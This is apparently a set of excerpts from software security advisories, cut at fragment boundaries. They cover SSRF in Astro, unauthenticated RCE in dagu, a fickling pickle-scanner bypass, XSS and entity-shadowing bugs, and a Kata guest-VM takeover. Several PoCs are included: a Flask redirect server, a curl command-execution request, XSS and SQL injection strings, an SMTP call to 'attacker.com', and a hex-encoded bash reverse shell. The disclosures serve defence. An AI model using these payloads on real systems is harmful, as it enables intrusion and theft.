          "html": "### Summary\n\nServer-Side Rendered pages that return an error with a prerendered custom error page (eg. `404.astro` or `500.astro`) are vulnerable to SSRF. If the `Host:` header is changed to an attacker's server, it will be fetched on `/500.html` and they can redirect this to any internal URL to read the response body through the first request.\n\n### Details\n\nThe following line of code fetches `statusURL` and returns the response back to the client:\n\nhttps://github.com/withastro/astro/blob/bf0b4bfc7439ddc565f61a62037880e4e701eb05/packages/astro/src/core/app/base.ts#L534\n\n`statusURL` comes from `this.baseWithoutTrailingSlash`, which [is built from the `Host:` header](https://github.com/withastro/astro/blob/e5e3208ee5041ad9cccd479c29a34bf6183a6505/packages/astro/src/core/app/node.ts#L81). `prerenderedErrorPageFetch()` is just `fetch()`, and **follows redirects**. This makes it possible for an attacker to set the `Host:` header to their server (eg. `Host: attacker.tld`), and if the server still receives the request without normalization, Astro will now fetch `http://attacker.tld/500.html`.\n\nThe attacker can then redirect this request to http://localhost:8000/ssrf.txt, for example, to fetch any locally listening service. The response code is not checked, because as the comment in the code explains, this fetch may give a 200 OK. The body and headers are returned back to the attacker.\n\nLooking at the vulnerable code, the way to reach this is if the `renderError()` function is called (error response during SSR) and the error page is prerendered (custom `500.astro` error page). The PoC below shows how a basic project with these requirements can be set up.\n\n**Note**: Another common vulnerable pattern for `404.astro` we saw is:\n\n```astro\nreturn new Response(null, {status: 404});\n```\n\nAlso, it does not matter what `allowedDomains` is set to, since it only checks the `X-Forwarded-Host:` header.\n\nhttps://github.com/withastro/astro/blob/9e16d63cdd2537c406e50d005b389ac115755e8e/packages/astro/src/core/app/base.ts#L146\n\n### PoC\n\n1. Create a new empty project\n\n```bash\nnpm create astro@latest poc -- --template minimal --install --no-git --yes\n```\n\n2. Create `poc/src/pages/error.astro` which throws an error with SSR:\n\n```astro\n---\nexport const prerender = false;\n\nthrow new Error(\"Test\")\n---\n```\n\n3. Create `poc/src/pages/500.astro` with any content like:\n\n```astro\n<p>500 Internal Server Error</p>\n```\n\n4. Build and run the app\n\n```bash\ncd poc\nnpx astro add node --yes\nnpm run build && npm run preview\n```\n\n5. Set up an \"internal server\" which we will SSRF to. Create a file called `ssrf.txt` and host it locally on http://localhost:8000:\n\n```bash\ncd $(mktemp -d)\necho \"SECRET CONTENT\" > ssrf.txt\npython3 -m http.server\n```\n\n6. Set up attacker's server with exploit code and run it, so that its server becomes available on http://localhost:5000:\n\n```python\n# pip install Flask\nfrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route(\"/500.html\")\ndef exploit():\n    return redirect(\"http://127.0.0.1:8000/ssrf.txt\")\n\nif __name__ == \"__main__\":\n    app.run()\n```\n\n7. Send the following request to the server, and notice the 500 error returns \"SECRET CONTENT\".\n\n```shell\n$ curl -i http://localhost:4321/error -H 'Host: localhost:5000'\nHTTP/1.1 500 OK\ncontent-type: text/plain\ndate: Tue, 03 Feb 2026 09:51:28 GMT\nlast-modified: Tue, 03 Feb 2026 09:51:09 GMT\nserver: SimpleHTTP/0.6 Python/3.12.3\nConnection: keep-alive\nKeep-Alive: timeout=5\nTransfer-Encoding: chunked\n\nSECRET CONTENT\n```\n\n### Impact\n\nAn attacker who can access the application without `Host:` header validation (eg. through finding the origin IP behind a proxy, or just by default) can fetch their own server to redirect to any internal IP. With this they can fetch cloud metadata IPs and interact with services in the internal network or localhost.\n\nFor this to be vulnerable, [a common feature](https://docs.astro.build/en/basics/astro-pages/#custom-500-error-page) needs to be used, with direct access to the server (no proxies).",

If the dashboard/agent is reachable (e.g., --dashboard-host=0.0.0.0), a web page via DNS rebinding or same-network access can\n  issue DELETE requests that shut down Serve or delete jobs without user interaction. This is a drive-by availability impact.\n\n  ### Details\n\n  - Middleware: python/ray/dashboard/http_server_head.py#get_browsers_no_post_put_middleware only checks POST/PUT via is_browser_request (UA/Origin/Sec-Fetch heuristics). DELETE is not gated.\n  - Endpoints lacking browser protection/auth by default:\n      - python/ray/dashboard/modules/serve/serve_head.py: @routes.delete(\"/api/serve/applications/\") calls serve.shutdown().\n      - python/ray/dashboard/modules/job/job_head.py: @routes.delete(\"/api/jobs/{job_or_submission_id}\").\n      - python/ray/dashboard/modules/job/job_agent.py: @routes.delete(\"/api/job_agent/jobs/{job_or_submission_id}\") (not wrapped with deny_browser_requests either).\n  - Dashboard token auth is optional and off by default; binding to 0.0.0.0 is common for remote access.\n\n  ### PoC\n\n  Prereqs: dashboard reachable (e.g., ray start --head --dashboard-host=0.0.0.0), no token auth.\n\n  1. Start Serve (or have jobs present).\n  2. From any browser-reachable origin (DNS rebinding or same-LAN page), issue a DELETE fetch:\n\n```  \nfetch(\"http://<dashboard-host>:8265/api/serve/applications/\", {\n    method: \"DELETE\",\n    headers: { \"User-Agent\": \"Mozilla/5.0\" }  // browsers set this automatically\n  });\n```\n\n  Result: Serve shuts down.\n  3) Similarly, delete jobs:\n\n ` fetch(\"http://<dashboard-host>:8265/api/jobs/<job_or_submission_id>\", { method: \"DELETE\" });`\n ` fetch(\"http://<dashboard-agent>:52365/api/job_agent/jobs/<job_or_submission_id>\", { method: \"DELETE\" });`\n\n  Browsers will send the Mozilla UA and Origin/Sec-Fetch headers, but DELETE is not blocked by the middleware, so the requests succeed.\n\n  ### Impact\n\n  - Availability loss: Serve shutdown; job deletion. Triggerable via drive-by browser requests if the dashboard/agent ports are reachable and auth is disabled (default).\n  - No code execution from this vector, but breaks isolation/trust assumptions for “developer-only” endpoints.\n  \n### Fix\nThe fix for this vulnerability is to update to Ray 2.54.0 or higher. \n\nFix PR: https://github.com/ray-project/ray/pull/60526",

Markdown links are not sufficiently sanitized, allowing `javascript:` URIs to be rendered as clickable links.\n\n## Impact Summary\nAn authenticated low-privilege attacker can post a malicious comment that injects persistent JavaScript. When another user clicks the link, the attacker can perform actions such as session hijacking, privilege escalation (including admin takeover), and data exfiltration.\n\n## Resolution/Fix\nThe issue was confirmed and fixed in the master branch. An official release will be published soon.\n\n## Workarounds\nUntil the release is available, validate and block unsafe URI schemes (e.g., `javascript:`) before rendering Markdown, and enable Parsedown Safe Mode.\n\n## Credits/Acknowledgement\nReported by Arkadiusz Marta (https://github.com/arkmarta/).",

The `UnusedVariables` heuristic works as expected.\n\n# Original report \n\n## Summary\n\nFickling's `check_safety()` API and `--check-safety` CLI flag incorrectly rate as\n`LIKELY_SAFE` pickle files that open outbound TCP connections at deserialization time\nusing stdlib network-protocol constructors: `smtplib.SMTP`, `imaplib.IMAP4`,\n`ftplib.FTP`, `poplib.POP3`, `telnetlib.Telnet`, and `nntplib.NNTP`.\n\nThe bypass exploits two independent root causes described below.\n\n---\n\n## Root Cause 1: Incomplete blocklist (fixed in PR #233)\n\n`fickling/fickle.py` (lines 41-97) defines `UNSAFE_IMPORTS`, the primary blocklist.\n`fickling/analysis.py` (lines 229-248) defines the parallel\n`UnsafeImportsML.UNSAFE_MODULES` dict. Both omitted the following stdlib\nnetwork-protocol modules whose constructors open a TCP socket at instantiation time:\n\n| Module | Class | Default port | Constructor side-effect |\n|---|---|---|---|\n| `smtplib` | `SMTP` | 25 | TCP connect, reads SMTP banner, sends EHLO |\n| `imaplib` | `IMAP4` | 143 | TCP connect, reads IMAP capability banner |\n| `ftplib` | `FTP` | 21 | TCP connect, reads FTP welcome banner |\n| `poplib` | `POP3` | 110 | TCP connect, reads POP3 greeting |\n| `telnetlib` | `Telnet` | 23 | TCP connect |\n| `nntplib` | `NNTP` | 119 | TCP connect, NNTP handshake |\n\nBecause these module names were absent from both blocklists, `UnsafeImportsML`,\n`UnsafeImports`, and `NonStandardImports` all stayed silent. All six are genuine\nstdlib modules so `is_std_module()` returned `True` and `NonStandardImports` did\nnot fire.\n\n**Status: patched in PR #233.** The six modules have been added to `UNSAFE_IMPORTS`.\n\n---\n\n## Root Cause 2: Logic flaw in `unused_assignments()` at `fickle.py:1183` (unpatched)\n\n### Description\n\n`unused_assignments()` in `fickling/fickle.py` (lines 1174-1204) identifies variables\nthat are assigned but never referenced. `UnusedVariables` analysis calls this method\nand raises `SUSPICIOUS` for any unreferenced variable -- this would otherwise catch a\nbare `REDUCE` opcode that stores its result without using it.\n\nThe flaw is at line 1183. The method iterates over `module_body` statements and, when\nit encounters the final `result = <expr>` assignment, breaks out of the loop\nimmediately without first walking the right-hand side expression for `Name` references:\n\n```python\n# fickling/fickle.py:1183 (current code -- vulnerable)\nif (\n    len(statement.targets) == 1\n    and isinstance(statement.targets[0], ast.Name)\n    and statement.targets[0].id == \"result\"\n):\n    # this is the return value of the program\n    break   # exits WITHOUT scanning statement.value\n```\n\nAny variable that appears only in the RHS of `result = <expr>` is therefore never\nadded to the `used` set and is incorrectly classified as unused.\n\n### How this enables bypass suppression\n\nWhen fickling processes a `REDUCE` opcode in isolation, it generates:\n\n```python\n_var0 = SMTP('attacker.com', 25)\nresult = _var0\n```\n\nBecause the loop breaks before scanning `result = _var0`, `_var0` never enters\n`used`. `UnusedVariables` sees `_var0` as unused and raises `SUSPICIOUS`.\n\nAdding a `BUILD` opcode with an empty dict after the `REDUCE` changes the generated\nAST to:\n\n```python\nfrom smtplib import SMTP\n_var0 = SMTP('attacker.com', 25)   # dangerous call\n_var1 = _var0                      # BUILD step 1: intermediate reference\n_var1.__setstate__({})             # BUILD step 2: state call\nresult = _var1\n```\n\nNow `_var0` appears on the RHS of `_var1 = _var0`, a statement processed before the\nbreak, so `_var0` correctly enters `used` and `UnusedVariables` stays silent.\n\nThe `__setstate__` call is excluded from `OvertlyBadEvals` because\n`ASTProperties.visit_Call` places it in `calls` but not in `non_setstate_calls`\n(line 562), and `OvertlyBadEvals` only iterates `non_setstate_calls`.\n\nThe `SMTP(...)` call is skipped by `OvertlyBadEvals` because `_process_import` adds\n`SMTP` to `likely_safe_imports` for any stdlib module (line 550), and `OvertlyBadEvals`\nskips calls whose function name is in `likely_safe_imports` (lines 339-345).\n\n**Net result: zero warnings, severity `LIKELY_SAFE`.**\n\nThis flaw is generic -- it applies to any module not on the blocklist, not just the\nsix fixed in PR #233. Any future blocklist gap can be silently exploited using the\nsame `REDUCE + EMPTY_DICT + BUILD` pattern as long as this flaw remains unpatched.\n\n### Bypass opcode sequence\n\n```\nOffset  Opcode            Argument\n------  ------            --------\n0       PROTO             4\n2       GLOBAL            'smtplib' 'SMTP'\n16      SHORT_BINUNICODE  'attacker.com'\n30      BININT2           25\n33      TUPLE2\n34      REDUCE                          <- TCP connection opened here\n35      EMPTY_DICT\n36      BUILD                           <- suppresses UnusedVariables via flaw\n37      STOP\n```\n\nFickling's synthetic AST for this sequence (what all analysis passes inspect):\n\n```python\nfrom smtplib import SMTP\n_var0 = SMTP('attacker.com', 25)\n_var1 = _var0\n_var1.__setstate__({})\nresult = _var1\n```\n\nNo analysis rule in fickling fires on this AST.\n\n### Proof of Concept\n\nRequires only `pip install fickling`.

Not OS-specific.\n\n### Impact\n\nAn attacker distributing a malicious pickle file (e.g. a crafted ML model checkpoint)\ncan silently:\n\n- **Enumerate victims** -- receive a TCP callback every time the pickle is loaded,\n  including in sandboxed environments\n- **Exfiltrate host identity** -- victim IP, hostname (via SMTP EHLO), and service\n  banners are sent to the attacker's server\n- **Probe internal services (SSRF)** -- if the victim host can reach internal SMTP\n  relays, IMAP stores, or FTP servers, the pickle probes those services on the\n  attacker's behalf\n- **Establish a covert channel** -- protocol handshakes carry attacker-controlled\n  bytes through a channel fickling explicitly labels safe\n\nThe `is_likely_safe()` helper (`fickling/analysis.py:468-474`) and the `--check-safety`\nCLI flag both gate on `severity == LIKELY_SAFE`. This bypass clears that gate\ncompletely with zero warnings.\n\n### Suggested fix\n\nWalk `statement.value` before the `break` so variables referenced only in the result\nassignment are correctly counted as used:\n\n```python\n# fickling/fickle.py:1183 -- suggested fix\nif (\n    len(statement.targets) == 1\n    and isinstance(statement.targets[0], ast.Name)\n    and statement.targets[0].id == \"result\"\n):\n    # scan RHS before breaking so variables used only here are marked as used\n    for node in ast.walk(statement.value):\n        if isinstance(node, ast.Name):\n            used.add(node.id)\n    break\n```\n\nThis is the same pattern already used for every other statement in the loop\n(lines 1200-1203). All 55 non-torch tests pass with this fix applied.\n\n---\n\n## Affected versions\n\nAll releases including `v0.1.7` (latest). Confirmed on latest `master` as of\n2026-02-19. Root cause 1 patched in PR #233 (master only, not yet released).\nRoot cause 2 unpatched as of this report.\n\n## Reporter\n\nAnmol Vats",

This bypasses entity encoding and leads to XSS when parsed output is rendered.\n\n## Details\n\nThe fix for CVE-2023-34104 addressed some regex metacharacters in entity names but missed `.` (period), which is valid in XML names per the W3C spec.\n\nIn `DocTypeReader.js`, entity names are passed directly to `RegExp()`:\n\n```js\nentities[entityName] = {\n    regx: RegExp(`&${entityName};`, \"g\"),\n    val: val\n};\n```\n\nAn entity named `l.` produces the regex `/&l.;/g` where `.` matches **any character**, including the `t` in `&lt;`. Since DOCTYPE entities are replaced before built-in entities, this shadows `&lt;` entirely.\n\nThe same issue exists in `OrderedObjParser.js:81` (`addExternalEntities`), and in the v6 codebase - `EntitiesParser.js` has a `validateEntityName` function with a character blacklist, but `.` is not included:\n\n```js\n// v6 EntitiesParser.js line 96\nconst specialChar = \"!?\\\\/[]$%{}^&*()<>|+\";  // no dot\n```\n\n## Shadowing all 5 built-in entities\n\n| Entity name | Regex created | Shadows |\n|---|---|---|\n| `l.` | `/&l.;/g` | `&lt;` |\n| `g.` | `/&g.;/g` | `&gt;` |\n| `am.` | `/&am.;/g` | `&amp;` |\n| `quo.` | `/&quo.;/g` | `&quot;` |\n| `apo.` | `/&apo.;/g` | `&apos;` |\n\n## PoC\n\n```js\nconst { XMLParser } = require(\"fast-xml-parser\");\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY l. \"<img src=x onerror=alert(1)>\">\n]>\n<root>\n  <text>Hello &lt;b&gt;World&lt;/b&gt;</text>\n</root>`;\n\nconst result = new XMLParser().parse(xml);\nconsole.log(result.root.text);\n// Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>\n```\n\nNo special parser options needed - `processEntities: true` is the default.\n\nWhen an app renders `result.root.text` in a page (e.g. `innerHTML`, template interpolation, SSR), the injected `<img onerror>` fires.\n\n`&amp;` can be shadowed too:\n\n```js\nconst xml2 = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY am. \"'; DROP TABLE users;--\">\n]>\n<root>SELECT * FROM t WHERE name='O&amp;Brien'</root>`;\n\nconst r = new XMLParser().parse(xml2);\nconsole.log(r.root);\n// SELECT * FROM t WHERE name='O'; DROP TABLE users;--Brien'\n```\n\n## Impact\n\nThis is a complete bypass of XML entity encoding. Any application that parses untrusted XML and uses the output in HTML, SQL, or other injection-sensitive contexts is affected.\n\n- Default config, no special options\n- Attacker can replace any `&lt;` / `&gt;` / `&amp;` / `&quot;` / `&apos;` with arbitrary strings\n- Direct XSS vector when parsed XML content is rendered in a page\n- v5 and v6 both affected\n\n## Suggested fix\n\nEscape regex metacharacters before constructing the replacement regex:\n\n```js\nconst escaped = entityName.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\nentities[entityName] = {\n    regx: RegExp(`&${escaped};`, \"g\"),\n    val: val\n};\n```\n\nFor v6, add `.` to the blacklist in `validateEntityName`:\n\n```js\nconst specialChar = \"!?\\\\/[].{}^&*()<>|+\";\n```\n\n## Severity\n\nEntity decoding is a fundamental trust boundary in XML processing. This completely undermines it with no preconditions.",

The root and all issuing certificates are assumed to be valid during the leaf certificate's validity. An issuing certificate with a validity that expires before the leaf certificate will be considered valid during verification even if the provided timestamp would mean the issuing certificate should be considered expired.\n\n## Impact\n\nNo impact to users of the public Sigstore infrastructure. This may affect private deployments with customized PKIs. In practice, this is unlikely to occur as CAs should not be issuing certificates that outlive the validity of the CA and its parents.\n\n## Workarounds\n\nUpgrade to the latest release, or verify the certificate chain out of band.\n\n## Example to Reproduce\n\n* Root CA certificate is valid from 12pm-2pm\n* Intermediate CA certificate is valid from 12:30pm-1:30pm\n* Leaf certificate is valid from 1pm-3pm - **Note that this is unlikely to happen in practice**, as a CA shouldn't issue a certificate that would be valid after the issuing CA certificate expires\n* Signature generated at 2:30pm with a signed timestamp\n* During verification, the leaf certificate's not before time (1pm) is used to verify the chain - 1pm is in the validity windows for the root and intermediate CA certificates\n* The timestamp's time is checked to be in the validity window of only the leaf certificate - 2:30pm is in the validity window for the leaf\n* Even though the root and intermediate would be expired at 2:30pm, verification succeeds",

When processing untrusted JSON input, this behavior may allow an attacker to instantiate arbitrary classes available in the application.\n\nIf a vulnerable application passes attacker-controlled JSON into JsonSerializer::unserialize() and contains classes with dangerous magic methods (such as `__wakeup()` or `__destruct()`), this may lead to PHP Object Injection and potentially Remote Code Execution (RCE), depending on available gadget chains in the application or its dependencies.\n\nThis behavior is similar in risk profile to PHP's native `unserialize()` when used without the `allowed_classes` restriction.\n\n### Impact\n\nThis vulnerability allows instantiation of arbitrary PHP classes via the `@type` field when deserializing JSON.\n\nApplications are impacted only if:\n* Untrusted or attacker-controlled JSON is passed into `JsonSerializer::unserialize()`, and\n* The application or its dependencies contain classes that can be leveraged as a gadget chain.\n\nSuccessful exploitation may lead to:\n* Arbitrary code execution\n* Data exfiltration\n* File manipulation\n* Denial of service\n\nApplications that only deserialize trusted data are not affected.\n\n### Patches\n\nThis issue is mitigated in version 3.2.3.\n\nVersion 3.2.3 introduces the method: `setAllowedClasses(?array $allowedClasses)`\n\nThis allows applications to restrict which classes may be instantiated during deserialization, similar to PHP's native `unserialize()` `allowed_classes` option.\n\nUsers should upgrade to version 3.2.3 or later and configure an appropriate class allowlist.\n\n### Workarounds\n\nIf upgrading is not immediately possible, applications should ensure that:\n* `JsonSerializer::unserialize()` is never called on untrusted or attacker-controlled JSON.\n* JSON input is validated and sanitized before deserialization.\n* Object instantiation via `@type` is disabled in application logic where possible.\n\nAfter upgrading, users can mitigate risk by explicitly configuring:\n\n```php\n$serializer->setAllowedClasses([]);\n```\n\nto disable all object instantiation, or by providing a strict allowlist of safe classes.\n\n### References\n\n* CWE-502: https://cwe.mitre.org/data/definitions/502.html\n* PHP `unserialize()` documentation: https://www.php.net/manual/en/function.unserialize.php\n* OWASP PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection",

The `POST /api/v2/dag-runs` endpoint accepts an inline YAML spec and executes its shell commands immediately with no credentials required — any dagu instance reachable over the network is fully compromised by default.\n\n### Details\n`internal/service/app/config/loader.go:226` sets `AuthModeNone` as the default. With no auth mode configured, `internal/frontend/api/v2/handlers/api.go:520` returns `nil` from `requireExecute()` — all permission checks pass without a valid session.\n\nThe `POST /api/v2/dag-runs` endpoint accepts a `spec` field containing a full YAML DAG definition. The spec is parsed and the commands execute immediately on the host with no validation beyond YAML parsing.\n\n### PoC\n```bash\ncurl -s -X POST http://TARGET:8080/api/v2/dag-runs \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"poc\",\"spec\":\"steps:\\n  - name: rce\\n    command: id > /tmp/pwned\\n\"}'\n# Response: {\"dagRunId\":\"<uuid>\"}\n# /tmp/pwned contains: uid=1000(dagu) gid=1000(dagu)\n```\nConfirmed on `ghcr.io/dagu-org/dagu:latest` with no configuration changes.\n\n### Impact\nEvery dagu deployment using default settings — every Docker deployment, every install following the documentation, every instance without explicit `DAGU_AUTH_MODE` configuration — is fully compromised without credentials. An attacker with network access gets OS command execution as the dagu process user.",

Inputs like `../../...` or absolute paths could escape the working directory in non-sandboxed mode.\n\n## Impact\n\nPractical impact depends on deployment and who can trigger tool execution. This is most relevant when tool invocation is exposed to less-trusted callers or when operators expected workspace-only containment.\n\n## Workarounds\n\n- Keep `tools.exec.applyPatch.enabled` disabled if you do not need `apply_patch`.\n- Keep `tools.exec.applyPatch.workspaceOnly` at its secure default of `true`.\n- Restrict who can trigger tool execution (and which tools are allowlisted).\n\n## Configuration Note\n\n`tools.exec.applyPatch.workspaceOnly: false` intentionally opts out of workspace containment and can re-enable outside-workspace writes/deletes.\n\n## Fix\n\n- PR: https://github.com/openclaw/openclaw/pull/16405\n- Merge commit: `5544646a09c0121fca7d7093812dc2de8437c7f1`\n\n## Credits\n\nThanks to @p80n-sec for reporting this issue.",

This affects websites hosting the standalone viewer HTML file and any other use of untrusted JSON config files (bypassing the protections of the `escapeHTML` parameter). As certain events fire without any additional user interaction, visiting a standalone viewer URL that points to a malicious config file&mdash;without additional user interaction&mdash;is sufficient to trigger the vulnerability and execute arbitrary JavaScript code, which can, for example, replace the contents of the page with arbitrary content and make it appear to be hosted by the website hosting the standalone viewer HTML file.\n\n### Patches\nThis has been fixed both in v2.5.7 and in the current development branch.\n\n### Workarounds\nSetting the `Content-Security-Policy` header to `script-src-attr 'none'` will block execution of inline event handlers, mitigating this vulnerability. Don't host `pannellum.htm` on a domain that shares cookies with user authentication to mitigate XSS risk.\n\n### Acknowledgments\n\nReported both by luminary (@lumin9ry), Visvge (@Sicclord1 / @Visvge), and sutol (@0x5a6163 / @SUT0L) and by another researcher who wishes not to be named at this time.",

This is exploitable when the `origins` array is configured and an attacker registers a domain starting with an allowed origin string (e.g., `https://target.com.attacker.com` bypasses `https://target.com`).\n\nOn its own, tokens are still redirected to a configured origin. However, in specific scenarios an attacker can initiate the OAuth flow from an unauthorized origin and exfiltrate tokens, achieving full account takeover.\n\n**Credits**:  Abdelwahed Madani Yousfi (@vvxhid) / Edoardo Geraci (@b0-n0-b0) / Thomas Rinsma (@ThomasRinsma) From Codean Labs.",

Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute `Object.prototype` via a crafted input using Array.prototype. The exploit works across Windows and Linux and on Node and Bun runtimes. This issue is fixed in version 12.1.2\n\n### Details\nThe vulnerability resides in line 94 of shared/utils.mjs where indexOf() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of swiper using npm install \n2. Run the following code snippet:\n```javascript\nvar swiper = require('swiper');\nArray.prototype.indexOf = () => -1;        \nlet obj = {};\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"yes\"}}';\nconsole.log({}.polluted);\nswiper.default.extendDefaults(JSON.parse(malicious_payload));\nconsole.log({}.polluted);  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how swiper is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service - Even if an attacker is not able to exploit prototype pollution in swiper, if there is a prototype pollution within the project from other dependencies, modifying global `Array.prototype.indexOf` property can result in crash when swiper.default.extendDefaults is called because swiper makes use of this global property. This can lead to Denial of Service.  \n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)\n\n### Related CVEs\n[CVE-2026-25521](https://github.com/advisories/GHSA-rxrv-835q-v5mh)\n[CVE-2026-25047](https://github.com/advisories/GHSA-2733-6c58-pf27)\n[CVE-2026-26021](https://github.com/advisories/GHSA-2c4m-g7rx-63q7)",

In this code path, deterministic IDs are used to decide whether an existing sandbox container can be reused safely. A collision in this hash could let one configuration be interpreted as another under the same sandbox cache identity, increasing the risk of cache poisoning and unsafe sandbox state reuse.\n\nThe implementation now uses SHA-256 for these deterministic hashes to restore collision resistance for this security-relevant identifier path.\n\n## Fix Commit(s)\n- `559c8d993`\n\n## Release Process Note\n`patched_versions` is pre-set to `2026.2.15` for the next release. After that release is published, mark this advisory ready for publication.\n\nThanks @kexinoh ( of Tencent zhuque Lab, by https://github.com/Tencent/AI-Infra-Guard) for reporting.",

The Gateway may exhaust memory or become unresponsive, causing a denial of service.\n\n### Fix\nThe Gateway now caps the downloaded response body size before any HTML parsing and adds additional guards to avoid running Readability/DOM parsing on pathological HTML.\n\n### Fix Commit(s)\n- 166cf6a3e04c7df42bea70a7ad5ce2b9df46d147\n\n### Release Process Note\nThis advisory is prepared for the next npm release.

In the case of html attributes, this can lead to XSS if there is a leaf variable in the attribute that is user controlled.\n\n### Details\n\nRelevant code:\nhttps://github.com/vapor/leaf-kit/blob/main/Sources/LeafKit/String%2BHTMLEscape.swift#L14\n\nStrings in Swift are based on extended grapheme clusters. HTML on the other hand is based on unicode characters. \n\nFor example if you have the sequence \"́  (U+0022 Quotation mark followed by U+0301 Combining Acute Accent). To HTML this is just a quote mark followed by some other random character. To swift this is one extended grapheme cluster that does not equal a quotation mark by itself which is a different extended grapheme cluster.\n\nThus `\"\\\"́\".replacingOccurrences(of: \"\\\"\", with: \"&quot;\")` does not replace the quote mark. This allows you to break out of html attributes.\n\nI believe replacingOccurences takes an optional third parameter that allows you to specify options to make it work on UTF-8 characters instead of grapheme clusters, which would be a good fix for this issue.\n\nI see depending on version, leafkit might use `replacing` instead of `replacingOccurences`. I don't know swift that well and couldn't find docs on what replacing does, so I don't know if both versions of the function are affected. The version of swift i was testing on I believe was using replacingOccurences\n\nIt seems like replacingOccurences will skip past prefix characters of extended grapheme clusters, which is what would be needed in order to meaningfully bypass esaping of <. Thus i think this is mostly limited to attributes and not general text.\n\n### PoC\n\nAn example vapor application that is vulnerable might look like\n\nroutes.swift\n```swift\nimport Vapor\n\nstruct Hello: Content {\n    var msg: String?\n}\n\nfunc routes(_ app: Application) throws {\n    app.post { req throws in\n\tlet Hello = try req.content.decode(Hello.self)\n        return req.view.render(\"hello\", [\n            \"msg\": Hello.msg ?? \"Hello World!\"\n        ])\n    }\n}\n```\n\nWith a hello.leaf that looks like\n```\n<div title=\"#(msg)\">Hover to see message</div>\n```\n\nAnd then you POST something like `msg=%22%cc%81=1%20autofocus%20tabindex=0%20onfocus=alert(1)%20`\n\n### Impact\nIf a website uses leaf to escape an attribute value based on user input, the attacker may be able to insert a malicious attribute. If a site is not using a secure CSP policy, then this can be used to execute malicious javascript (XSS). Impact is context dependent if a site is using a secure CSP policy.",

The following procedure has been validated strictly within a local 'Kind' environment and has not undergone exhaustive testing across diverse production architectures. Proceed with caution.\n\nTo mitigate the identified traffic bypass, ensure all ingress traffic from the `cilium_wg0` interface is explicitly routed to `cilium_host` for policy enforcement. This ensures that host-level security policies are applied to decrypted WireGuard traffic. Execute the following configuration on each CiliumNode:\n\n```bash\n# IPv4 Traffic\nip rule add iif cilium_wg0 table 300\nip route add default dev cilium_host table 300\n\n# IPv6 Traffic\nip -6 rule add iif cilium_wg0 table 300\nip -6 route add default dev cilium_net table 300\n```\n\n### Acknowledgements\n\nSpecial thanks to @julianwiedmann for reporting the issue and helping with the resolution.\n\n### For more information\n\nIf you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at security@cilium.io. This is a private mailing list for the Cilium security team, and your report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.",

          "html": "### Summary\n\nAn issue in Kata with Cloud Hypervisor allows a user of the container to modify the file system used by the Guest micro VM ultimately achieving arbitrary code execution as root in said VM. The current understinding is this doesn’t impact the security of the Host or of other containers / VMs running on that Host (note that arm64 QEMU lacks NVDIMM read-only support: It is believed that until the upstream QEMU gains this capability, a guest write could reach the image file).\n\n### Details\n\n_Linux virtio-pmem_\nThe `virtio-pmem` probe path always registers the region as a generic pagemap that supports asynchronous flushes, but it never marks the region as read-only.  Only the `ND_REGION_PAGEMAP` and `ND_REGION_ASYNC` bits are set before the region is created, so `nd_region->ro always` stays cleared and the block device is left writable.\n\nLater, `pmem_attach_disk()` wires the region into the block layer with full read/write semantics – the block device operations call `pmem_do_write()` which performs cache-flushed memcpy operations directly into the host-provided shared memory window. `nvdimm_check_and_set_ro()` would set the disk read-only if the region had been flagged as such, but because `virtio_pmem` never sets that flag, the helper becomes a no-op.\n\n_Cloud-Hypervisor virtio_pmem_\n`discard_writes=on` causes the file backing the `virtio-pmem` device to be opened read-only and mapped with `MAP_PRIVATE` rather than `MAP_SHARED`. That combination means the guest can modify the private copy of the mapped pages, but those modifications never propagate back to the underlying file. The guest (and Cloud Hypervisor process) will still read the modified data because it lives in the private copy of the mapping, so write-then-read sequences appear to succeed even though nothing is persisted. Once the mapping is dropped or the VM is restarted, those copy-on-write changes disappear, leaving the backing file unchanged.\n\n_Kata /dev/pmem0_\nKata boots each pod/VM by DAX-mapping a read-only guest image from the host into the VM and telling the guest kernel to mount the resulting `/dev/pmem*` device as its root filesystem.\nSince DAX maps the backing file directly into guest memory, there is no way for the hypervisor to intercept or reject individual stores, so a container with sufficient permissions can open `/dev/pmem0` and observe its own writes until the VM is rebooted or the cache is dropped.\n\n### PoC\n\nWhen putting all this together, this means that a user of a Container (not necessarily privileged, we don’t need `CAP_SYS_ADMIN`, but we need `CAP_MKNOD`) can modify the Guest OS filesystem, replacing libraries or binaries to achieve arbitrary code execution outside of the Container. This requires computing offsets of files within the device, which requires information like the partition start sector, sector size in bytes, the filesystem block size, and the physical block index of the file.\n\nTo achieve execution on the Guest, I replaced `/usr/bin/systemd-tmpfiles` with a connect-back shell to `localhost`: timers end up executing 15min after boot.\nI use `debugfs` to not require mounting privileges and work directly with the filesystem on `/dev/pmem0p1` to get the absolute offset of the file to modify in the device.\n\nIf you want a simpler PoC, just `dd` write something into `/dev/pmem0` and observe it's `dd` readable until discarded.\n\n```\nroot@ab5392da44ce:~# mknod /dev/pmem0 b 259 0\nroot@ab5392da44ce:~# mknod /dev/pmem0p1 b 259 1\nroot@ab5392da44ce:~# python pmem.py --file /usr/bin/systemd-tmpfiles --write --pattern 23212f62696e2f626173680a62617368202d69203e26202f6465762f7463702f3132372e302e302e312f34343320303e26310a6578697420300a\n=== Resolution 